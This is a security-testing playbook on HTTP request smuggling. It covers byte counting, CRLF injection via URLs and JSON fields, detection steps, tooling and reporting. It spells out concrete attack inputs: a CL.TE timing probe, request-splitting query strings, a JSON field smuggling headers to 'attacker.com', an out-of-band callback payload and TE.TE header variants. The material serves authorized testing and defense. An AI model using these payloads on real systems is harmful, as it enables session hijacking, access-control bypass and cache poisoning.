# HTTP Request Smuggling Playbook: Framing, Byte Counting, Detection, and Exploitation

## Table of Contents

1. [Overview of HTTP Request Smuggling](#1-overview-of-http-request-smuggling)
2. [Byte Counting for Content-Length and Transfer-Encoding: chunked](#2-byte-counting-for-content-length-and-transfer-encoding-chunked)
3. [Newlines (CRLF) in URLs and HTTP Headers](#3-newlines-crlf-in-urls-and-http-headers)
   - 3.1 [JSON Body Fields as a CRLF Injection Vector](#31-json-body-fields-as-a-crlf-injection-vector-second-order-smuggling)
   - 3.2 [Obsolete Line-Ending Tolerance (Bare LF)](#32-obsolete-line-ending-tolerance-bare-lf)
4. [Detection Methodology](#4-detection-methodology)
5. [TE.TE Obfuscation Variants](#5-tete-obfuscation-variants-concrete-payloads-to-test)
6. [Tooling](#6-tooling)
7. [Impact — What Smuggling Enables](#7-impact--what-smuggling-enables)
8. [Verification & Troubleshooting Checklist](#8-verification--troubleshooting-checklist)
9. [Reporting Template](#9-reporting-template)
10. [Reference URLs & Standards Documentation](#10-reference-urls--standards-documentation)

---

## 1. Overview of HTTP Request Smuggling

HTTP request smuggling occurs when front-end (reverse proxy, CDN, or load balancer) and back-end (origin or application) servers disagree on where one HTTP request ends and the next begins. This ambiguity typically arises when two components interpret `Content-Length` (`CL`) and `Transfer-Encoding` (`TE`) headers differently, or when ambiguous header/newline parsing allows request boundaries to desynchronize.

### High-Level Desynchronization Concepts

- **CL.TE vs. TE.CL Ambiguity:** One layer prioritizes `Content-Length` while the next prioritizes `Transfer-Encoding: chunked`, causing leftover bytes in a connection buffer to be interpreted as the start of a subsequent request.
- **TE.TE Obfuscation:** Both layers support `Transfer-Encoding`, but variations in header formatting or whitespace lead one layer to ignore `Transfer-Encoding` and fall back to `Content-Length`.
- **Defensive Alignment:** End-to-end HTTP/2 or consistent HTTP/1.1 parsing, strict header normalization, rejecting ambiguous `CL` + `TE` combinations, and normalizing connection reuse reduce framing mismatches.

### HTTP/2 and the Downgrade Point (H2.CL / H2.TE)

Everything above — and the byte-level mechanics in Section 2 — is specific to **HTTP/1.1's text-based framing**. HTTP/2 frames are **length-prefixed and binary** (each frame carries an explicit length field in its header), which removes the CL/TE ambiguity *within* HTTP/2 itself — there's no `\r\n` to misparse.

The real-world risk reappears at the **protocol downgrade boundary**: it's extremely common for a front-end (CDN, load balancer) to terminate HTTP/2 from the client and then re-encode the request as HTTP/1.1 to talk to the origin/back-end. If that re-encoding step is flawed, two additional desync classes appear:

- **H2.CL**: The front-end honors an HTTP/2 pseudo-header or request body framing, but when translating to HTTP/1.1 it emits a `Content-Length` that the back-end then parses independently of how the front-end chunked/forwarded the data — leftover bytes desync the connection, same effect as classic CL.TE.
- **H2.TE**: HTTP/2 technically forbids `Transfer-Encoding` as a request header (RFC 9113 §8.2.2), but some front-ends pass it through anyway during downgrade, and if the back-end then honors it while the front-end's framing assumed otherwise, the same TE-based desync primitive reappears.

**Practical note for testing:** when a target is served over HTTP/2, identify where TLS/H2 terminates (CDN edge, load balancer) and treat that boundary — not the origin server — as the thing to fuzz for CL/TE handling during re-encoding. Burp's HTTP Request Smuggler extension and recent PortSwigger research ("HTTP/2: The Sequel is Always Worse") specifically target this downgrade point; it's worth testing even when the back-end itself is pure HTTP/1.1 and seemingly unrelated to H2.

---

## 2. Byte Counting for `Content-Length` and `Transfer-Encoding: chunked`

In HTTP/1.1, line endings use `CRLF` (`\r\n`, **2 bytes**). Accurate byte counting requires separating **body payload bytes**, **body wire bytes**, and **full request wire bytes**.

### A. `Content-Length` Byte Counting & Example

`Content-Length` specifies the exact number of bytes in the **message body** after character encoding (e.g., UTF-8).

#### Full Wire Example (`Content-Length`)

Below is a complete HTTP/1.1 request with explicit `\r\n` markers shown:

```text
POST /submit HTTP/1.1\r\n
Host: example.com\r\n
Content-Type: text/plain\r\n
Content-Length: 5\r\n
\r\n
hello
```

**Line-by-Line Byte Breakdown:**

1. Request line: `POST /submit HTTP/1.1` (21) + `\r\n` (2) = **23 bytes**
2. Header 1: `Host: example.com` (17) + `\r\n` (2) = **19 bytes**
3. Header 2: `Content-Type: text/plain` (24) + `\r\n` (2) = **26 bytes**
4. Header 3: `Content-Length: 5` (17) + `\r\n` (2) = **19 bytes**
5. Empty line separating headers and body: `\r\n` = **2 bytes**
6. Body payload (`hello`): **5 bytes**

- **Body Payload / Wire Bytes:** `5` bytes (`Content-Length: 5`)
- **Total Request Wire Bytes:** $23 + 19 + 26 + 19 + 2 + 5 = \\mathbf{94\\text{ bytes}}$

> **Multi-byte UTF-8 Note:** The string `"café"` has 4 characters, but `é` (`\xc3\xa9`) takes 2 bytes in UTF-8, making the body **5 bytes** (`Content-Length: 5`).

---

### B. `Transfer-Encoding: chunked` Byte Counting & Example

With chunked encoding, data is sent in chunks prefixed by a hexadecimal byte length and `\r\n`, terminated by `0\r\n\r\n`.

#### Full Wire Example (`Transfer-Encoding: chunked`)

Here is the same endpoint receiving two 5-byte chunks (`hello` and `world`):

```text
POST /submit HTTP/1.1\r\n
Host: example.com\r\n
Transfer-Encoding: chunked\r\n
\r\n
5\r\n
hello\r\n
5\r\n
world\r\n
0\r\n
\r\n
```

**Line-by-Line Byte Breakdown:**

1. Request line: `POST /submit HTTP/1.1` (21) + `\r\n` (2) = **23 bytes**
2. Header 1: `Host: example.com` (17) + `\r\n` (2) = **19 bytes**
3. Header 2: `Transfer-Encoding: chunked` (26) + `\r\n` (2) = **28 bytes**
4. Empty line separating headers and body: `\r\n` = **2 bytes**
5. Chunk 1 header: `5` (1) + `\r\n` (2) = **3 bytes**
6. Chunk 1 data + terminator: `hello` (5) + `\r\n` (2) = **7 bytes**
7. Chunk 2 header: `5` (1) + `\r\n` (2) = **3 bytes**
8. Chunk 2 data + terminator: `world` (5) + `\r\n` (2) = **7 bytes**
9. Final zero chunk + trailing blank line: `0` (1) + `\r\n` (2) + `\r\n` (2) = **5 bytes**

- **Decoded Payload Bytes:** $5 + 5 = \\mathbf{10\\text{ bytes}}$
- **Chunked Body Wire Bytes:** $3 + 7 + 3 + 7 + 5 = \\mathbf{25\\text{ bytes}}$
- **Total Request Wire Bytes:** $23 + 19 + 28 + 2 + 25 = \\mathbf{97\\text{ bytes}}$

---

### C. Quick Comparison

| Metric | `Content-Length` | `Transfer-Encoding: chunked` |
| --- | --- | --- |
| **Length Declaration** | Single decimal byte count in header | Per-chunk hexadecimal sizes on the wire |
| **Decoded Body Bytes** | Equals `Content-Length` | Sum of individual chunk payloads |
| **Body Wire Bytes** | Same as `Content-Length` | Payloads + `<hex>\r\n` + `\r\n` + `0\r\n\r\n` |
| **Framing Sensitivity** | Mismatches truncate or over-read body | Invalid hex, missing `\r\n`, or early `0` alters boundaries |

---

## 3. Newlines (`CRLF`) in URLs and HTTP Headers

### Role of `CRLF` in HTTP Framing

HTTP/1.1 uses `CRLF` (`\r\n`) to terminate the request line and each header line, and an empty line (`\r\n`) to separate headers from the body. Because line breaks delimit protocol structure, unvalidated newlines in headers or URL-derived values can alter header boundaries or inject headers.

### URL Encoding Examples for Newlines

URLs cannot contain raw line breaks, so control characters are represented via percent-encoding:

- `%0D` = Carriage Return (`CR`, ASCII `13`, `\r`)
- `%0A` = Line Feed (`LF`, ASCII `10`, `\n`)
- `%0D%0A` = `CRLF` (`\r\n`)

#### Example 1: Standard Encoded Query Parameter (Safe Data)

When passing multi-line text inside a query parameter safely, encoders convert newlines into `%0D%0A` (or `%0A`) so the URL remains on a single request line:

```text
https://example.com/notes?text=Line%201%0D%0ALine%202
```

On the wire, the HTTP request line stays intact:

```text
GET /notes?text=Line%201%0D%0ALine%202 HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```

#### Example 2: Unsanitized URL Parameter Reflected into a Response Header (CRLF / Header Splitting Risk)

If an application decodes a query parameter such as:

```text
https://example.com/redirect?next=%2Fdashboard%0D%0AX-Custom-Header%3A%20injected
```

and writes the decoded value directly into an HTTP response header without stripping `\r` and `\n`, the response splits into two headers:

```text
HTTP/1.1 302 Found\r\n
Location: /dashboard\r\n
X-Custom-Header: injected\r\n
\r\n
```

Modern web servers and frameworks block raw `\r` and `\n` in header setters by default, raising an error or returning `400 Bad Request` if unencoded newlines appear in incoming request lines or headers.

> **Caveat — this protection isn't universal:** Strict rejection of raw CR/LF applies at the HTTP library layer (the component that serializes `Request`/`Response` objects). It does **not** automatically protect code paths that manually construct raw HTTP text — e.g., hand-rolled reverse proxies, custom SSRF-prone fetchers, or logging/forwarding code that concatenates strings into something later sent over a raw socket. Any place user input flows into a manually-built request/response string is a candidate for re-introducing this bug above the "safe" HTTP layer.

#### Example 3: Walkthrough — Encoding a Request-Smuggling Payload Into a Query String

This walks through converting a raw desired request into something that can travel inside a URL query parameter, and what it looks like once decoded back into raw bytes by a vulnerable reflector.

**Target raw bytes (what an attacker wants the back-end to eventually see):**

```text
GET /path HTTP/1.1\r\n
Host: xyz.com\r\n
Cookie: abc=dflsdfa;\r\n
```

**Step 1 — Percent-encode the control characters and reserved bytes** A URL cannot contain a literal space, `\r`, or `\n`, so each must be percent-encoded before it can be placed inside a query value:

| Character | Encoding |
| --- | --- |
| Space | `%20` |
| `\r` (CR) | `%0D` |
| `\n` (LF) | `%0A` |

**Step 2 — Resulting encoded query parameter**

```text
/hello?acb=xofoGET%20/path%20HTTP/1.1%0D%0AHost:%20xyz.com%0D%0ACookie:%20abc=dflsdfa;%0D%0A
```

**Step 3 — What happens on the wire (two different outcomes)**

*Outcome A — Safe / expected behavior:* A correctly-implemented server treats everything after `acb=` as **opaque query-string data**. The `%0D%0A` sequences stay percent-encoded all the way through parsing; they are never translated into literal `\r\n` bytes on the wire. The request the back-end actually processes is just:

```text
GET /hello?acb=xofoGET%20/path%20HTTP/1.1%0D%0AHost:%20xyz.com%0D%0ACookie:%20abc=dflsdfa;%0D%0A HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```

One single request line, one single request — nothing is split, because `%0D%0A` is just text to the parser.

*Outcome B — Vulnerable behavior:* If some component in the chain (an application, a custom proxy, or code that manually rebuilds a raw request/response from the decoded parameter) **URL-decodes `acb` and then writes the decoded bytes into a raw request or response stream without re-validating for `\r`/`\n`**, the decoded value collapses back into literal `CRLF`s:

```text
GET /path HTTP/1.1\r\n
Host: xyz.com\r\n
Cookie: abc=dflsdfa;\r\n
```

At that point the parser sees what looks like a complete second request line and header block, which is how a single incoming URL can be turned into what the back-end treats as two distinct requests (header/request splitting, and — if chained with the framing issues in Section 2 — full request smuggling).

**Key takeaway:** The vulnerability is never in the percent-encoding itself (that's just a safe transport mechanism for arbitrary bytes). It's in whatever downstream code decodes the parameter and concatenates the result directly into a raw protocol stream instead of treating it as inert data.

### 3.1 JSON Body Fields as a CRLF Injection Vector (Second-Order Smuggling)

This is a distinct mechanism from the CL.TE/TE.CL framing desync in Sections 2 and 4. Framing desync happens at the **HTTP protocol layer**, before application code inspects the body. JSON-based smuggling happens one layer up: it's a **second-order CRLF injection**, where a JSON parser correctly decodes an escaped control character, and something *downstream* then carelessly reuses that decoded string in a context where `\r\n` has protocol meaning again.

**Why this isn't a bug in JSON itself:** JSON requires line breaks inside string values to be escaped — `\r` → `\\r`, `\n` → `\\n`, or Unicode-escaped as `\u000d` / `\u000a`. A compliant JSON parser decoding these back into real `0x0D`/`0x0A` bytes is normal, correct behavior. The vulnerability only appears later, if those decoded bytes get re-serialized into a raw outbound request/header/log line without re-validation.

**Where it becomes exploitable:**

- An API gateway or backend-for-frontend (BFF) reads a JSON field and copies it into a header it sets on an *outbound* request to a backend microservice.
- A webhook/notification service builds a raw HTTP request to a third-party URL using a JSON field as part of the path, headers, or request line (common in custom SSRF-prone "forward this request" code).
- A logging/audit pipeline writes JSON body fields into log lines that are later replayed or parsed as structured HTTP traffic.

#### Worked Example

**Request received by the service:**

```text
POST /webhook-config HTTP/1.1\r\n
Content-Type: application/json\r\n
\r\n
{"callback_host": "attacker.com\r\nX-Forwarded-For: 127.0.0.1\r\nAuthorization: Bearer stolen"}
```

**Outcome A — Safe / expected behavior:** The service JSON-decodes `callback_host` into the string `attacker.com\r\nX-Forwarded-For: 127.0.0.1\r\nAuthorization: Bearer stolen` and treats it strictly as **data** — e.g., validating it as a hostname, rejecting control characters, or passing it through a header-setting API that encodes/rejects CR/LF automatically. No downstream request is affected.

**Outcome B — Vulnerable behavior:** The service naively string-concatenates the decoded field into a new raw request it is building, for example:

```python
headers = f"Host: {callback_host}\r\n..."  # naive, unvalidated concatenation
```

The decoded `\r\n` bytes re-emerge as real header boundaries in the *newly constructed outbound* request:

```text
Host: attacker.com\r\n
X-Forwarded-For: 127.0.0.1\r\n
Authorization: Bearer stolen\r\n
...
```

This smuggles extra headers — or, if the field lands early enough in a hand-built raw request string, an entire second request — into that outbound connection.

**Key distinction for testing:** Section 2/4 material (CL.TE/TE.CL) is a transport-layer framing ambiguity between two independent HTTP parsers on the same connection. This JSON case is an application-layer re-injection: same root cause as the URL case in Example 2/3 above (decode once, forget to re-validate before the next serialization step), but the entry point is a JSON body field instead of a URL query parameter, and the vulnerable sink is typically an *outbound* request the service itself constructs rather than its own response.

### Defensive Practices

- Reject or strip `\r` and `\n` in header values and URL parameters before header construction.
- Treat every JSON string field as untrusted even after decoding; re-validate for `\r`/`\n` immediately before it is used to build any raw request, header, or log line — decoding once does not make a value safe for reuse in a second protocol context.
- Avoid concatenating raw user input directly into HTTP headers; use framework header APIs and strict allowlists.
- Keep front-end and back-end servers updated so strict RFC header validation is enforced consistently.

### 3.2 Obsolete Line-Ending Tolerance (Bare LF)

RFC 9112 §2.2 requires `CRLF` (`\r\n`) as the line terminator for the request line and every header line, but explicitly permits recipients to tolerate a **bare `LF`** (`\n` alone, no preceding `\r`) for robustness with older clients. This tolerance is itself a desync primitive, independent of CL/TE handling:

- If the **front-end** treats only `\r\n` as a valid line terminator but the **back-end** also accepts a bare `\n`, an attacker can smuggle a value containing `\n` (without `\r`) past a filter that only checks for `\r\n`, and the back-end will still parse it as a real line break.
- Conversely, if a WAF or input filter strips/blocks `\r\n` sequences specifically (as a CRLF-injection defense) but doesn't also reject bare `\n`, that filter can be bypassed entirely using lone `%0A` while the back-end still honors it as a line terminator.

**Test payload variant:** repeat every CRLF-injection probe in Sections 3 and 3.1 with the `\r` removed — e.g. `%0A` alone instead of `%0D%0A` — against both the filtering layer and the final parser, since the two may disagree on whether a bare LF counts as a line break.

---

## 4. Detection Methodology

Detection should proceed in increasing order of intrusiveness: confirm an anomaly exists, then prove it's exploitable, without disrupting production traffic. **All steps below require reusing a single TCP connection across requests** — most HTTP clients/tools open a fresh connection per request by default, which hides this class of bug entirely.

### Step 1 — Timing-Based Probe (CL.TE)

Send a request where the front-end will forward the full body (trusting `Content-Length`) but a CL.TE-vulnerable back-end will stop reading at the chunk terminator and hang waiting for more data:

```text
POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
1\r\n
A\r\n
X
```

- If the response is delayed (e.g., times out around 5–10s) compared to a baseline request, the back-end is likely parsing `Transfer-Encoding` and waiting on a final `0\r\n\r\n` that never arrives — indicating **CL.TE**.
- Run the inverse (TE.CL) probe by swapping which header the crafted body satisfies, to test the opposite desync direction.

### Step 2 — Differential / Desync Confirmation

A timing delay alone is suggestive, not conclusive (network jitter can cause false positives). Confirm exploitability by sending **two requests back-to-back on the same connection**:

1. **Request A**: a smuggling attempt whose leftover bytes are crafted to prepend onto whatever follows.
2. **Request B**: a normal, distinguishable request (e.g., to a known static path).

If Request B's response reflects the *injected* content from Request A (wrong status code, wrong body, or headers that shouldn't be there), the desync is real and exploitable — not just a timing artifact.

### Step 3 — Harmless Smuggled Request (Safe PoC)

Rather than targeting a sensitive endpoint, smuggle a request to an innocuous, known resource (e.g., a 404 path or static asset) and verify the *next* connection/response sees that injected request's effect. This gives a safe, reproducible proof-of-concept for a report without touching production data or other users' sessions.

> **Production safety note:** Steps 2–3 can affect *other users'* in-flight requests on a shared back-end connection pool. Only perform desync confirmation against systems you're authorized to test, ideally in a staging environment, and prefer the least-impactful payload that still proves the issue.

### Step 4 — Out-of-Band Confirmation for Application-Layer (JSON/Second-Order) Injection

Steps 1–3 confirm transport-layer framing desync. The JSON-based vector in Section 3.1 is application-layer and won't show up as a connection-level timing anomaly, so it needs a different confirmation method:

1. Identify a JSON field that is plausibly re-used downstream in an outbound request, header, or log line (e.g., a callback URL, hostname, or redirect target field).
2. Submit a value containing an escaped CRLF followed by an injected header pointing at a domain you control and can observe (a Burp Collaborator-style out-of-band listener, or any DNS/HTTP endpoint you monitor), e.g.:

   ```json
   {"callback_host": "legit.example.com\r\nX-Smuggle-Test: oob-abc123\r\nHost: attacker-controlled-oob-domain.test"}
   ```
3. Monitor the out-of-band listener for an incoming request/DNS lookup, or check accessible logs for the literal injected header appearing in an *outbound* request the service made.
4. If the injected header/line appears in traffic the service itself generated, the re-serialization step is vulnerable — this is a confirmed finding independent of any CL/TE framing issue.

This is inherently slower and noisier than Steps 1–3 (no immediate timing signal), so budget for asynchronous confirmation rather than expecting an instant response-based tell.

---

## 5. TE.TE Obfuscation Variants (Concrete Payloads to Test)

TE.TE desyncs rely on getting exactly one of the two servers to silently ignore a malformed `Transfer-Encoding` header and fall back to `Content-Length`. Different server/proxy implementations disagree on which of these they accept — test each variant individually against both front-end and back-end where possible:

| Variant | Example |
| --- | --- |
| Trailing whitespace/tab before colon | `Transfer-Encoding : chunked` |
| Duplicate headers, conflicting values | `Transfer-Encoding: chunked` + `Transfer-Encoding: identity` |
| Case variation | `Transfer-Encoding: Chunked`, `TRANSFER-ENCODING: CHUNKED` |
| Invalid/extended token | `Transfer-Encoding: xchunked` |
| Comma-separated with valid token present | `Transfer-Encoding: chunked, identity` |
| Line-folding (obsolete, RFC 7230 §3.2.4) | `Transfer-Encoding:\r\n\tchunked` |
| Non-standard whitespace in value | `Transfer-Encoding:\tchunked` |

Each accepted-by-one / rejected-by-other combination is a potential TE.TE desync primitive. Document which specific server/version pairs accept which variant — this is highly implementation-specific and changes between software versions.

---

## 6. Tooling

- **Burp Suite Pro — "HTTP Request Smuggler" extension** (by James Kettle / PortSwigger): automates CL.TE, TE.CL, and TE.TE probing, including most header obfuscation variants above.
- **Burp Repeater — "Send group in sequence (single connection)"**: required for any multi-request desync test; ensures requests share one TCP connection rather than Burp opening a new one per request.
- **`smuggler.py`** (defparam): standalone CLI scanner for smuggling classes, useful outside the Burp ecosystem or for automation/CI.
- **PortSwigger Web Security Academy**: free, hands-on labs covering CL.TE, TE.CL, TE.TE, request tunnelling, and response queue poisoning against intentionally vulnerable targets — the best place to rehearse these payloads before testing live systems.

---

## 7. Impact — What Smuggling Enables

Document which of these applies when writing up a finding; impact varies significantly by architecture:

- **Front-end access control bypass**: reaching paths/methods the proxy is supposed to block (e.g., internal admin routes) by smuggling a request the front-end never inspects.
- **Response/session hijacking**: a smuggled request's response gets delivered to a *different* user sharing the same back-end connection, potentially leaking session tokens or private data.
- **Cache poisoning**: smuggling a request that causes a cache to store an attacker-controlled response against a legitimate cache key.
- **Client-side desync chains**: using smuggling as a primitive to deliver reflected XSS or SSRF payloads that wouldn't otherwise reach the target context.

---

## 8. Verification & Troubleshooting Checklist

- [ ] Confirm whether byte counts are measured on the decoded body or the full wire stream (including `\r\n` delimiters and chunk hex sizes).
- [ ] Verify multi-byte character encoding (such as UTF-8) when calculating `Content-Length`.
- [ ] Check how proxies and origin servers handle `Transfer-Encoding` alongside `Content-Length` or control characters (`%0D`, `%0A`).
- [ ] Ensure consistent HTTP version handling and connection reuse policies between edge and origin layers.
- [ ] Confirm testing tool reuses a single TCP connection across probe requests (Section 4 requires this).
- [ ] Ran timing probe (Step 1) **and** differential confirmation (Step 2) — timing alone is not conclusive.
- [ ] Tested TE.TE obfuscation variants individually (Section 5) rather than assuming one universal payload.
- [ ] If target is served over HTTP/2, identified the TLS/H2 termination point and tested H2.CL/H2.TE downgrade handling there (Section 1).
- [ ] Repeated CRLF probes with bare `\n` (`%0A` alone) in addition to full `\r\n` (`%0D%0A`), to catch filter/parser line-ending disagreements (Section 3.2).
- [ ] Tested JSON body fields that are plausibly reused downstream, using out-of-band confirmation (Section 4, Step 4) rather than assuming no application-layer vector exists.

---

## 9. Reporting Template

Use these fields for any confirmed finding:

- **Front-end fingerprint**: server/software + version (proxy, CDN, or load balancer)
- **Back-end fingerprint**: server/software + version (origin/application)
- **Smuggling class**: CL.TE / TE.CL / TE.TE (and obfuscation variant, if applicable)
- **Raw PoC request(s)**: exact bytes, including `\r\n` shown explicitly (use Burp Repeater's raw/hex view)
- **Evidence**: timing delta and/or differential response showing confirmed desync (Section 4, Steps 1–2)
- **Affected endpoint(s) / boundary bypassed**: e.g., which access control or routing rule was circumvented
- **Remediation**: disable ambiguous CL+TE combinations per RFC 9112 §6.3 (formerly RFC 7230 §3.3.3); normalize on HTTP/2 end-to-end where possible; ensure front-end and back-end reject rather than tolerate malformed framing headers

---

## 10. Reference URLs & Standards Documentation

- **RFC 9112 — HTTP/1.1 (Message Syntax and Routing):** [https://www.rfc-editor.org/rfc/rfc9112](https://www.rfc-editor.org/rfc/rfc9112)
- **RFC 9110 — HTTP Semantics:** [https://www.rfc-editor.org/rfc/rfc9110](https://www.rfc-editor.org/rfc/rfc9110)
- **OWASP — HTTP Request Smuggling:** [https://owasp.org/www-community/attacks/HTTP_Request_Smuggling](https://owasp.org/www-community/attacks/HTTP_Request_Smuggling)
- **OWASP — CRLF Injection:** [https://owasp.org/www-community/vulnerabilities/CRLF_Injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection)
- **PortSwigger Web Security Academy — HTTP Request Smuggling:** [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- **CWE-444 — Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling'):** [https://cwe.mitre.org/data/definitions/444.html](https://cwe.mitre.org/data/definitions/444.html)
- **CWE-113 — Improper Neutralization of CRLF Sequences in HTTP Headers:** [https://cwe.mitre.org/data/definitions/113.html](https://cwe.mitre.org/data/definitions/113.html)